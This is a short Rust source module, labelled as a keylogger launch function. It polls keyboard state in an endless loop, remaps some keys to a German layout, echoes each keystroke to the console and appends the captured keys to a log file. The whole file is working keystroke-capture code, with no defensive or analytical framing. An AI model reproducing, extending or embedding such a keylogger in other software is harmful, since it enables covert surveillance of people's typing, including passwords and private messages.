use device_query::{DeviceQuery, DeviceState, Keycode};
use std::fs::OpenOptions;
use std::io::Write;

use crate::constants::FILTER_KEYS;

/// Keylogger launch function
pub fn run(path: String) {
    let device_state = DeviceState::new();

    let mut prev_keys = vec![];

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .expect("Failed to open file");

    let filter_keys: Vec<String> = FILTER_KEYS.iter().map(|v| v.to_string()).collect();

    loop {
        let keys = device_state.get_keys();
        if keys != prev_keys && !keys.is_empty() {
            // Filter out unwanted single keys
            if keys.len() == 1 {
                if filter_keys.contains(&format!("{:?}", keys[0])) {
                    continue;
                }

                let s = format!("{:?}", keys[0]).to_lowercase();

                println!("{}", s);

                // remap to german
                let s: &str = match keys[0] {
                    Keycode::Z => "Y",
                    Keycode::Y => "Z",
                    Keycode::Minus => "ß",
                    Keycode::Equal => "´",
                    Keycode::RightBracket => "+",
                    Keycode::BackSlash => "#",
                    Keycode::Comma => ",",
                    Keycode::Dot => ".",
                    Keycode::Slash => "-",
                    _ => &s,
                };
                println!("remapped {}", s);

                write!(file, "{}", s).expect("Failed to write to file");
            } else if keys.len() == 2 {
                // TODO: Handle dual key info

                println!("{:?}", keys);
            }
        }
        prev_keys = keys;
    }
}
